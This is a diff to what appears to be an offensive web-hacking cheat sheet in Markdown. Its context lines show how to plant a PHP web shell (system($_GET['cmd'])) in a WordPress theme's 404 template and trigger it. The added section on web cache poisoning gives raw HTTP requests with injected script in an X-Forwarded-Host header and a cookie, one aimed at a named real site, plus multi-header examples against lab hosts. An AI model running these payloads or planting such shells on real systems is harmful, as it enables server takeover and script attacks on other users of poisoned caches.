@@ -731,3 +731,40 @@ you need to have acces to wp-admin.
 - select "Themes to edit" ex: "twenty seventeen" and "select"
 - edit "404 template" and add `system($_GET['cmd']);` at second lines.
 - then go /wp-content/themes/tewentyseventeen/404.php?cmd=id
+
+## *Top 15./ Web cache poisoning*    
+
+Poisoning the cache server so that HTTP response serv to other user. Exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.  
+Here the way to exploit web cache poisoning:  
+![](Web_cache_process.png)
+
+**Find unkeyed input**  
+Use extention ParaMiner in burp, send request in ParaMiner.   
+Wait and look at Extension > Paraminer > Output.
+
+**Basic Example cache studie with unkeyed header**
+```
+GET /en?dontpoisoneveryone=1 HTTP/1.1
+Host: www.redhat.com
+X-Forwarded-Host: a."><script>alert(1)</script>
+
+HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+…
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
+```
+
+**Unkeyed cookie**
+```
+GET / HTTP/1.1
+Host: vulnerable.com
+Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
+```
+
+**Multiple header**
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
+X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
+X-Forwarded-Scheme: http
+```
